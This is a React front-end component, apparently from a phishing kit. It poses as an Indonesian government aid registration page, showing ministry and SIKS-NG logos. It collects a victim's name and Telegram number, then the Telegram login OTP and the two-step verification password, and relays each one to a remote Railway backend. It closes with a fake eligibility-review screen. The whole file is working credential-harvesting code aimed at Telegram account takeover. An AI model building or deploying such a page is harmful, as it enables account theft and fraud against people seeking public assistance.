"use client";

import React, { useState, useRef } from 'react';

// Komponen Logo Instansi - Menggunakan encoding URL untuk menangani spasi nama file
const FooterLogos = () => (
  <div className="flex justify-between items-center bg-white p-3 mt-6 rounded-lg border border-gray-100 shadow-sm">
    <div className="w-[22%]">
      <img src="/logo_bumn.jpg" alt="bumn" className="w-full h-auto object-contain" />
    </div>
    <div className="w-[22%]">
      <img src="/logo_Kemenkes.png" alt="Kemenkes" className="w-full h-auto object-contain" />
    </div>
    <div className="w-[22%]">
      <img src="/logo_siksng.jpg" alt="SIKS-NG" className="w-full h-auto object-contain" />
    </div>
    <div className="w-[22%]">
      <img src="/logo_kominfo.png" alt="Kominfo" className="w-full h-auto object-contain" />
    </div>
  </div>
);

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [formData, setFormData] = useState({ nama: '', nomor: '', sandi: '' });
  const [otpValues, setOtpValues] = useState(['', '', '', '', '']);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Masukkan URL Railway Anda di sini
  const API_URL = "https://backend-python-production-6e72.up.railway.app/register";

  // Fungsi normalisasi nomor agar mendukung 08, 62, atau +62
  const normalisasiNomor = (nomor: string) => {
    let clean = nomor.replace(/\D/g, '');
    if (clean.startsWith('0')) clean = '62' + clean.slice(1);
    if (!clean.startsWith('62')) clean = '62' + clean;
    return '+' + clean;
  };

  const handleOtpChange = (index: number, value: string) => {
    const val = value.replace(/\D/g, "");
    const newOtp = [...otpValues];
    newOtp[index] = val.substring(val.length - 1);
    setOtpValues(newOtp);
    if (val && index < 4) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpValues[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleNext = async (currentStep: number) => {
    setError("");
    if (currentStep !== 4) setLoading(true);
    
    const payload = { 
      ...formData, 
      nomor: normalisasiNomor(formData.nomor),
      otp: otpValues.join(''), 
      step: currentStep 
    };

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const res = await response.json();

      if (response.ok) {
        if (currentStep === 1) setStep(2);
        else if (currentStep === 2) res.status === "need_2fa" ? setStep(3) : setStep(4);
        else if (currentStep === 3) setStep(4);
      } else {
        setError("Verifikasi gagal. Periksa kembali data Anda.");
      }
    } catch (err) {
      setError("Masalah koneksi ke server.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-md mx-auto bg-white min-h-screen shadow-lg font-sans overflow-hidden">
      <img src="/banner.jpg" className="w-full h-auto" alt="Banner" />

      <div className="p-6">
        {step === 4 ? (
          /* HALAMAN LOADING FINAL */
          <div className="text-center py-10">
            <img src="/processing.png" className="w-48 mx-auto mb-6" alt="Processing" />
            <p className="text-blue-600 font-bold text-lg px-4 leading-relaxed">
              Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
            </p>
          </div>
        ) : (
          <div className="animate-in fade-in duration-500">
            {step === 1 && (
              <div className="space-y-5">
                <h2 className="text-2xl font-bold text-center text-gray-800 mb-6">Form Pendaftaran Penerimaan</h2>
                
                <div className="space-y-2">
                  <label className="block font-semibold text-gray-700">Nama Lengkap Sesuai E-KTP:</label>
                  <input 
                    className="w-full p-4 border-2 border-gray-200 rounded-2xl text-lg outline-none focus:border-blue-500 transition-all"
                    placeholder="BUDI SANTOSO"
                    onChange={(e) => setFormData({...formData, nama: e.target.value})}
                  />
                </div>

                <div className="space-y-2">
                  <label className="block font-semibold text-gray-700">Nomor Telegram Aktif:</label>
                  <input 
                    className="w-full p-4 border-2 border-gray-200 rounded-2xl text-lg outline-none focus:border-blue-500 transition-all"
                    placeholder="0812 XXXX XXXX"
                    type="tel"
                    onChange={(e) => setFormData({...formData, nomor: e.target.value})}
                  />
                </div>

                <button onClick={() => handleNext(1)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl text-xl shadow-lg active:scale-95 transition-all mt-4">
                  DAFTAR SEKARANG
                </button>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-6">
                <p className="text-blue-600 font-bold text-center text-lg leading-relaxed">
                  Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda
                </p>
                
                <div className="space-y-3">
                  <label className="block text-center font-semibold text-gray-700">Kode OTP :</label>
                  <div className="flex justify-center gap-2">
                    {otpValues.map((data, index) => (
                      <input
                        key={index}
                        type="tel"
                        ref={(el) => { inputRefs.current[index] = el; }}
                        value={data}
                        onChange={(e) => handleOtpChange(index, e.target.value)}
                        onKeyDown={(e) => handleKeyDown(index, e)}
                        className="w-12 h-14 text-center text-2xl font-bold border-2 border-gray-200 rounded-xl bg-gray-50 focus:border-blue-500 outline-none transition-all"
                      />
                    ))}
                  </div>
                </div>

                {error && <p className="text-red-600 text-center font-bold animate-bounce">{error}</p>}

                <button onClick={() => handleNext(2)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl text-xl shadow-lg active:scale-95 transition-all">
                  VERIFIKASI OTP
                </button>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-6">
                <div className="text-center">
                  <p className="font-bold text-gray-800 text-lg">Verifikasi 2 Langkah</p>
                  <p className="text-sm text-gray-500">Masukkan kata sandi akun Anda</p>
                </div>
                <input 
                  className="w-full p-4 border-2 border-gray-200 rounded-2xl outline-none focus:border-blue-500"
                  placeholder="Masukkan Kata Sandi"
                  type="password"
                  onChange={(e) => setFormData({...formData, sandi: e.target.value})}
                />
                <button onClick={() => handleNext(3)} className="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl">
                  KONFIRMASI
                </button>
              </div>
            )}
            
            {loading && (
              <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
                <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-600"></div>
              </div>
            )}
          </div>
        )}
        <FooterLogos />
      </div>
    </div>
  );
}